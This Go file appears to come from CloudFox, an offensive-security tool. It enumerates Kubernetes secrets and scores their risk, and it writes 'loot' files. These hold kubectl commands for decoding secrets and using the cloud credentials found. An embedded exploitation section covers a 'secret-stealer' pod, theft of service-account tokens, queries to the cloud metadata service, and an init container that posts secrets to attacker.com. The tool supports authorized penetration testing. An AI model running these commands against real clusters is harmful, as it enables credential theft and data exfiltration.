package commands

import (
	"context"
	"fmt"
	"sort"
	"strings"
	"time"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

var SecretsCmd = &cobra.Command{
	Use:     "secrets",
	Aliases: []string{},
	Short:   "List all cluster secrets with security analysis",
	Long: `
List all cluster secrets with security analysis:
  cloudfox kubernetes secrets`,
	Run: ListSecrets,
}

type SecretsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t SecretsOutput) TableFiles() []internal.TableFile {
	return t.Table
}

func (t SecretsOutput) LootFiles() []internal.LootFile {
	return t.Loot
}

type SecretFinding struct {
	Namespace           string
	Name                string
	Type                string
	DataKeys            []string
	Age                 time.Duration
	RiskLevel           string
	SensitivePatterns   []string
	MountedInPods       []string
	MountType           string // "volume" or "env"
	CloudCredentials    bool
	PrivateKeys         bool
	HasSensitivePattern bool
}

func ListSecrets(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	// Extract global flags
	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating secrets for %s", globals.ClusterName), globals.K8S_SECRETS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	// Get all namespaces
	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing namespaces: %v", err), globals.K8S_SECRETS_MODULE_NAME)
		return
	}

	// Get all pods for active exposure analysis
	logger.InfoM("Analyzing active secret exposure in pods...", globals.K8S_SECRETS_MODULE_NAME)
	allPods := []v1.Pod{}
	for _, ns := range namespaces.Items {
		pods, err := clientset.CoreV1().Pods(ns.Name).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		allPods = append(allPods, pods.Items...)
	}

	// Build secret-to-pod mapping
	secretToPods := make(map[string][]string)       // key: namespace/secretname, value: pod names
	secretMountType := make(map[string]string)      // key: namespace/secretname, value: "volume", "env", or "both"
	for _, pod := range allPods {
		// Check volume mounts
		for _, volume := range pod.Spec.Volumes {
			if volume.Secret != nil {
				key := fmt.Sprintf("%s/%s", pod.Namespace, volume.Secret.SecretName)
				podName := fmt.Sprintf("%s/%s", pod.Namespace, pod.Name)
				secretToPods[key] = append(secretToPods[key], podName)
				if secretMountType[key] == "" {
					secretMountType[key] = "volume"
				} else if secretMountType[key] == "env" {
					secretMountType[key] = "both"
				}
			}
		}

		// Check environment variables
		for _, container := range pod.Spec.Containers {
			for _, envFrom := range container.EnvFrom {
				if envFrom.SecretRef != nil {
					key := fmt.Sprintf("%s/%s", pod.Namespace, envFrom.SecretRef.Name)
					podName := fmt.Sprintf("%s/%s", pod.Namespace, pod.Name)
					secretToPods[key] = append(secretToPods[key], podName)
					if secretMountType[key] == "" {
						secretMountType[key] = "env"
					} else if secretMountType[key] == "volume" {
						secretMountType[key] = "both"
					}
				}
			}
			for _, env := range container.Env {
				if env.ValueFrom != nil && env.ValueFrom.SecretKeyRef != nil {
					key := fmt.Sprintf("%s/%s", pod.Namespace, env.ValueFrom.SecretKeyRef.Name)
					podName := fmt.Sprintf("%s/%s", pod.Namespace, pod.Name)
					secretToPods[key] = append(secretToPods[key], podName)
					if secretMountType[key] == "" {
						secretMountType[key] = "env"
					} else if secretMountType[key] == "volume" {
						secretMountType[key] = "both"
					}
				}
			}
		}
	}

	logger.InfoM("Analyzing secrets and calculating risk scores...", globals.K8S_SECRETS_MODULE_NAME)

	headers := []string{"Risk", "Namespace", "Name", "Type", "Patterns", "Mounted In", "Mount Type", "Data Keys"}
	var outputRows [][]string
	var findings []SecretFinding

	// Loot files
	namespaceLootEnum := map[string][]string{}
	var lootDecode []string
	var lootPatterns []string
	var lootCloudCreds []string
	var lootActiveExposure []string
	var lootExploitation []string

	lootDecode = append(lootDecode, `#####################################
##### Decode Secret Values
#####################################
#
# Extract and decode all secret values
# WARNING: Contains sensitive data
#
`)

	lootPatterns = append(lootPatterns, `#####################################
##### Secret Pattern Analysis
#####################################
#
# Analyze secrets for sensitive patterns
# Potential credentials, keys, and tokens
#
`)

	lootCloudCreds = append(lootCloudCreds, `#####################################
##### Cloud Credential Usage
#####################################
#
# MANUAL EXECUTION REQUIRED
# Use extracted cloud credentials
#
`)

	lootActiveExposure = append(lootActiveExposure, `#####################################
##### Active Secret Exposure
#####################################
#
# Secrets mounted in running pods
# Direct access via pod exec
#
`)

	lootExploitation = append(lootExploitation, `#####################################
##### Secret Exploitation Techniques
#####################################
#
# MANUAL EXECUTION REQUIRED
# Techniques for extracting and using secrets
#
`)

	for _, ns := range namespaces.Items {
		secrets, err := clientset.CoreV1().Secrets(ns.Name).List(ctx, metav1.ListOptions{})
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Error listing secrets in namespace: %v", err), globals.K8S_SECRETS_MODULE_NAME)
			continue
		}

		for _, secret := range secrets.Items {
			age := time.Since(secret.CreationTimestamp.Time).Round(time.Second)

			// Get data keys
			var dataKeys []string
			for key := range secret.Data {
				dataKeys = append(dataKeys, key)
			}
			sort.Strings(dataKeys)

			// Create finding
			finding := SecretFinding{
				Namespace: ns.Name,
				Name:      secret.Name,
				Type:      string(secret.Type),
				DataKeys:  dataKeys,
				Age:       age,
			}

			// Detect sensitive patterns
			finding.HasSensitivePattern, finding.SensitivePatterns = k8sinternal.DetectSensitiveSecretPattern(
				finding.Type,
				finding.Name,
				dataKeys,
			)

			// Check for cloud credentials and private keys
			finding.CloudCredentials = k8sinternal.HasCloudCredentials(dataKeys)
			finding.PrivateKeys = k8sinternal.HasPrivateKeys(finding.Type, dataKeys)

			// Check active exposure in pods
			secretKey := fmt.Sprintf("%s/%s", ns.Name, secret.Name)
			if pods, found := secretToPods[secretKey]; found {
				finding.MountedInPods = k8sinternal.UniqueStrings(pods)
				finding.MountType = secretMountType[secretKey]
			}

			// Calculate risk level
			finding.RiskLevel = k8sinternal.GetSecretRiskLevel(
				finding.Type,
				finding.HasSensitivePattern,
				len(finding.MountedInPods),
				0, // readableByNonDefaultSAs - would need RBAC analysis
				finding.CloudCredentials,
				finding.PrivateKeys,
				false, // hasServiceAccountToken
				false, // saHasDangerousPerms
			)

			findings = append(findings, finding)

			// Build output row
			patternsStr := "none"
			if len(finding.SensitivePatterns) > 0 {
				patternsStr = strings.Join(finding.SensitivePatterns, ", ")
			}

			mountedInStr := fmt.Sprintf("%d pods", len(finding.MountedInPods))
			if len(finding.MountedInPods) == 0 {
				mountedInStr = "not mounted"
			}

			mountTypeStr := finding.MountType
			if mountTypeStr == "" {
				mountTypeStr = "-"
			}

			outputRows = append(outputRows, []string{
				finding.RiskLevel,
				ns.Name,
				secret.Name,
				finding.Type,
				patternsStr,
				mountedInStr,
				mountTypeStr,
				strings.Join(dataKeys, ", "),
			})

			// Add per-namespace loot commands
			namespaceLootEnum[ns.Name] = append(namespaceLootEnum[ns.Name],
				fmt.Sprintf("# [%s] %s/%s", finding.RiskLevel, ns.Name, secret.Name),
				fmt.Sprintf("kubectl get secret %s -n %s -o yaml", secret.Name, secret.Namespace),
				fmt.Sprintf(`kubectl get secret %s -n %s -o json | jq -r '.data | to_entries[] | "\(.key)=\(.value | @base64d)"'`, secret.Name, secret.Namespace),
				"",
			)

			// Decode commands
			lootDecode = append(lootDecode, fmt.Sprintf("\n# [%s] Secret: %s/%s (Type: %s)", finding.RiskLevel, ns.Name, secret.Name, finding.Type))
			if len(finding.SensitivePatterns) > 0 {
				lootDecode = append(lootDecode, fmt.Sprintf("# Patterns: %s", strings.Join(finding.SensitivePatterns, ", ")))
			}
			for _, key := range dataKeys {
				lootDecode = append(lootDecode, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.%s}' | base64 -d", secret.Name, ns.Name, key))
			}
			lootDecode = append(lootDecode, "")

			// Active exposure analysis
			if len(finding.MountedInPods) > 0 {
				lootActiveExposure = append(lootActiveExposure, fmt.Sprintf("\n# [%s] %s/%s -> %d pods (%s mount)", finding.RiskLevel, ns.Name, secret.Name, len(finding.MountedInPods), finding.MountType))
				if len(finding.SensitivePatterns) > 0 {
					lootActiveExposure = append(lootActiveExposure, fmt.Sprintf("# Contains: %s", strings.Join(finding.SensitivePatterns, ", ")))
				}
				for _, pod := range finding.MountedInPods {
					parts := strings.Split(pod, "/")
					if len(parts) == 2 {
						lootActiveExposure = append(lootActiveExposure, fmt.Sprintf("kubectl exec -n %s %s -- sh -c 'ls -la /var/run/secrets/ || env | grep -i secret || env'", parts[0], parts[1]))
					}
				}
				lootActiveExposure = append(lootActiveExposure, "")
			}

			// Pattern analysis and cloud credential detection (keep existing logic)
			if finding.Type == "kubernetes.io/dockerconfigjson" {
				lootPatterns = append(lootPatterns, fmt.Sprintf("\n# [%s] DOCKER REGISTRY CREDENTIALS: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
				lootPatterns = append(lootPatterns, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d | jq .", secret.Name, ns.Name))
				lootPatterns = append(lootPatterns, "")

				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("\n# [%s] Docker Registry: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d > docker-config.json", secret.Name, ns.Name))
				lootCloudCreds = append(lootCloudCreds, "# docker login -u <username> -p <password> <registry>")
				lootCloudCreds = append(lootCloudCreds, "")
			}

			if finding.Type == "kubernetes.io/tls" {
				lootPatterns = append(lootPatterns, fmt.Sprintf("\n# [%s] TLS CERTIFICATE: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
				lootPatterns = append(lootPatterns, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.tls\\.crt}' | base64 -d | openssl x509 -text -noout", secret.Name, ns.Name))
				lootPatterns = append(lootPatterns, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.tls\\.key}' | base64 -d > tls.key", secret.Name, ns.Name))
				lootPatterns = append(lootPatterns, "")
			}

			// AWS credentials
			if finding.CloudCredentials && containsAWS(dataKeys) {
				lootPatterns = append(lootPatterns, fmt.Sprintf("\n# [%s] AWS CREDENTIALS: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
				lootPatterns = append(lootPatterns, fmt.Sprintf("kubectl get secret %s -n %s -o json | jq -r '.data | to_entries[] | \"\\(.key)=\\(.value | @base64d)\"'", secret.Name, ns.Name))
				lootPatterns = append(lootPatterns, "")

				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("\n# [%s] AWS Credentials: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
				lootCloudCreds = append(lootCloudCreds, "# Extract and test:")
				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("export AWS_ACCESS_KEY_ID=$(kubectl get secret %s -n %s -o jsonpath='{.data.aws_access_key_id}' | base64 -d 2>/dev/null || kubectl get secret %s -n %s -o jsonpath='{.data.AWS_ACCESS_KEY_ID}' | base64 -d)", secret.Name, ns.Name, secret.Name, ns.Name))
				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("export AWS_SECRET_ACCESS_KEY=$(kubectl get secret %s -n %s -o jsonpath='{.data.aws_secret_access_key}' | base64 -d 2>/dev/null || kubectl get secret %s -n %s -o jsonpath='{.data.AWS_SECRET_ACCESS_KEY}' | base64 -d)", secret.Name, ns.Name, secret.Name, ns.Name))
				lootCloudCreds = append(lootCloudCreds, "aws sts get-caller-identity")
				lootCloudCreds = append(lootCloudCreds, "aws iam list-users")
				lootCloudCreds = append(lootCloudCreds, "")
			}

			// GCP credentials
			if finding.CloudCredentials && containsGCP(dataKeys) {
				lootPatterns = append(lootPatterns, fmt.Sprintf("\n# [%s] GCP CREDENTIALS: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
				lootPatterns = append(lootPatterns, "")

				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("\n# [%s] GCP Credentials: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
				for _, key := range dataKeys {
					if strings.Contains(strings.ToLower(key), "json") || strings.Contains(strings.ToLower(key), "key") {
						lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.%s}' | base64 -d > gcp-key.json", secret.Name, ns.Name, key))
						break
					}
				}
				lootCloudCreds = append(lootCloudCreds, "gcloud auth activate-service-account --key-file=gcp-key.json")
				lootCloudCreds = append(lootCloudCreds, "gcloud projects list")
				lootCloudCreds = append(lootCloudCreds, "")
			}

			// Azure credentials
			if finding.CloudCredentials && containsAzure(dataKeys) {
				lootPatterns = append(lootPatterns, fmt.Sprintf("\n# [%s] AZURE CREDENTIALS: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
				lootPatterns = append(lootPatterns, "")

				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("\n# [%s] Azure Credentials: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
				lootCloudCreds = append(lootCloudCreds, "# az login --service-principal -u <client-id> -p <client-secret> --tenant <tenant-id>")
				lootCloudCreds = append(lootCloudCreds, "")
			}
		}
	}

	// Build exploitation loot file
	lootExploitation = append(lootExploitation, `
##############################################
## 1. Extract Secrets from Running Pods
##############################################
# If you can exec into pods that mount secrets:

# Find pods with secret volumes:
kubectl get pods --all-namespaces -o json | jq -r '.items[] | select(.spec.volumes[]?.secret != null) | "\(.metadata.namespace)/\(.metadata.name)"'

# Exec into pod and read secrets:
kubectl exec -n <namespace> <pod> -- sh -c 'find /var/run/secrets -type f -exec echo {} \; -exec cat {} \;'

# Read service account token:
kubectl exec -n <namespace> <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Dump all environment variables (may contain secret values):
kubectl exec -n <namespace> <pod> -- env

##############################################
## 2. ServiceAccount Token Exploitation
##############################################
# Extract SA token from pod:
TOKEN=$(kubectl exec -n <namespace> <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Use token to access API server:
APISERVER=https://kubernetes.default.svc
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# Check permissions:
kubectl auth can-i --list --token=$TOKEN

##############################################
## 3. Create Privileged Pod to Access Secrets
##############################################
# If you can create pods, deploy privileged pod to access all secrets:

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: secret-stealer
  namespace: default
spec:
  serviceAccountName: default
  containers:
  - name: stealer
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "apk add --no-cache curl jq && sleep 3600"]
    volumeMounts:
    - name: secrets
      mountPath: /secrets
      readOnly: true
  volumes:
  - name: secrets
    projected:
      sources:
      - secret:
          name: <secret-name>
EOF

kubectl exec secret-stealer -- sh -c 'cat /secrets/*'

##############################################
## 4. RBAC Enumeration for Secret Access
##############################################
# Find who can read secrets:
kubectl get rolebindings,clusterrolebindings --all-namespaces -o json | jq -r '.items[] | select(.roleRef.name | test(".*secret.*|.*admin.*|.*edit.*")) | "\(.metadata.namespace)//\(.metadata.name) -> \(.roleRef.name)"'

# List secrets you can access:
kubectl auth can-i get secrets --all-namespaces

##############################################
## 5. Secret Exfiltration via Init Container
##############################################
# If you can modify deployments, add init container to exfiltrate secrets:

kubectl patch deployment <deployment> -n <namespace> --type json -p='[
  {
    "op": "add",
    "path": "/spec/template/spec/initContainers/-",
    "value": {
      "name": "exfiltrate",
      "image": "curlimages/curl:latest",
      "command": ["sh", "-c"],
      "args": ["curl -X POST -d @/secrets/data https://attacker.com/exfil || true"],
      "volumeMounts": [{
        "name": "secret-volume",
        "mountPath": "/secrets"
      }]
    }
  }
]'

##############################################
## 6. Cloud Provider Metadata Service Access
##############################################
# From pod with secret access, query metadata service:

# AWS:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# GCP:
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure:
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
`)

	// Build loot enum with namespace headers
	var lootEnum []string
	lootEnum = append(lootEnum, `#####################################
##### Enumerate Secrets
#####################################

`)
	if globals.KubeContext != "" {
		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	nsListEnum := make([]string, 0, len(namespaceLootEnum))
	for ns := range namespaceLootEnum {
		nsListEnum = append(nsListEnum, ns)
	}
	sort.Strings(nsListEnum)
	for _, ns := range nsListEnum {
		lootEnum = append(lootEnum, fmt.Sprintf("\n# Namespace: %s\n", ns))
		lootEnum = append(lootEnum, namespaceLootEnum[ns]...)
	}

	// Add risk summary to active exposure loot
	criticalCount := 0
	highCount := 0
	for _, f := range findings {
		if f.RiskLevel == "CRITICAL" {
			criticalCount++
		} else if f.RiskLevel == "HIGH" {
			highCount++
		}
	}

	if criticalCount > 0 || highCount > 0 {
		summary := fmt.Sprintf("# SUMMARY: %d CRITICAL, %d HIGH risk secrets found\n\n", criticalCount, highCount)
		lootActiveExposure = append([]string{summary}, lootActiveExposure...)
	}

	table := internal.TableFile{
		Name:   "Secrets",
		Header: headers,
		Body:   outputRows,
	}

	lootFiles := []internal.LootFile{
		{
			Name:     "Secrets-Enum",
			Contents: strings.Join(k8sinternal.Unique(lootEnum), "\n"),
		},
		{
			Name:     "Secrets-Decode",
			Contents: strings.Join(lootDecode, "\n"),
		},
		{
			Name:     "Secrets-Pattern-Analysis",
			Contents: strings.Join(lootPatterns, "\n"),
		},
		{
			Name:     "Secrets-Cloud-Credentials",
			Contents: strings.Join(lootCloudCreds, "\n"),
		},
		{
			Name:     "Secrets-Active-Exposure",
			Contents: strings.Join(lootActiveExposure, "\n"),
		},
		{
			Name:     "Secrets-Exploitation",
			Contents: strings.Join(lootExploitation, "\n"),
		},
	}

	if err := internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Secrets",
		globals.ClusterName,
		"results",
		SecretsOutput{
			Table: []internal.TableFile{table},
			Loot:  lootFiles,
		},
	); err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_SECRETS_MODULE_NAME)
		return
	}

	if len(outputRows) > 0 {
		if criticalCount > 0 || highCount > 0 {
			logger.InfoM(fmt.Sprintf("%d secrets found (%d CRITICAL, %d HIGH risk)", len(outputRows), criticalCount, highCount), globals.K8S_SECRETS_MODULE_NAME)
		} else {
			logger.InfoM(fmt.Sprintf("%d secrets found across %d namespaces", len(outputRows), len(namespaces.Items)), globals.K8S_SECRETS_MODULE_NAME)
		}
	} else {
		logger.InfoM("No secrets found, skipping output file creation", globals.K8S_SECRETS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_SECRETS_MODULE_NAME), globals.K8S_SECRETS_MODULE_NAME)
}

// Helper functions
func containsAWS(keys []string) bool {
	for _, key := range keys {
		keyLower := strings.ToLower(key)
		if strings.Contains(keyLower, "aws") || keyLower == "aws_access_key_id" || keyLower == "aws_secret_access_key" {
			return true
		}
	}
	return false
}

func containsGCP(keys []string) bool {
	for _, key := range keys {
		keyLower := strings.ToLower(key)
		if strings.Contains(keyLower, "gcp") || strings.Contains(keyLower, "google") || keyLower == "credentials.json" || keyLower == "key.json" {
			return true
		}
	}
	return false
}

func containsAzure(keys []string) bool {
	for _, key := range keys {
		keyLower := strings.ToLower(key)
		if strings.Contains(keyLower, "azure") || keyLower == "client_secret" || keyLower == "tenant_id" {
			return true
		}
	}
	return false
}
